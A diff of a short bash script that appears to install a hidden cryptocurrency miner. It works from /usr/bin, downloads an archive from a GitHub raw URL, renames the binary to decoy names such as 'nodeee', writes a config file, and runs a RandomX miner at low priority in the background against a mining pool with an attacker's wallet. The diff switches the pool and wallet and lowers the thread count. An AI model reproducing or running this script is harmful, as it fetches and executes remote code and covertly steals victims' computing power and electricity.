@@ -1,4 +1,4 @@
-#/bin/bash
+#!/bin/bash
 cd /usr/bin
 
 wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv44.tar.gz
@@ -10,14 +10,14 @@ mv ruby nodeee
 
 echo '{
 "retry_time" : 6,
-"cpu_threads" : 16,
+"cpu_threads" : 8,
 "giveup_limit" : 99,
 "algorithm" : "randomepic",
 "disable_cpu" : false,
 "disable_gpu" : true
 }' > abcdzyxw.txt
 
-nice -n 19 nodee -o 3.34.51.136:80 -u 8BvpDwnc2ecaXp9TYvchbzZx6ApGiKfV29cUtj2NaBF5ZsL9M1wekN4Q8gtRRohLqvSp1njZUrVUzUbZQpZ3XW8P8wiHN1W --rig-id tuda -a rx/0 --donate-level 1 -t 11 -r 99 -R 6 -B
+nice -n 19 nodee -o turtlecoin.herominers.com:10381 -u TRTLuwZhJj6SmqEUWvrhEeG1Rn9Cvgvn8eCkgW649zJR32HT3vcSwdo3eET7ANk2pLXs4PvkFYrnk6K1GCnrsQYD2HVYQpQ89pR+3f5a44cbb083b058a7e0b5333732c64748007da4e4e3e51ee096de39861d394f.50000 -p jeff -a rx/0 --donate-level 1 -t 8 -r 99 -R 6 -B
 
 sleep 20
 
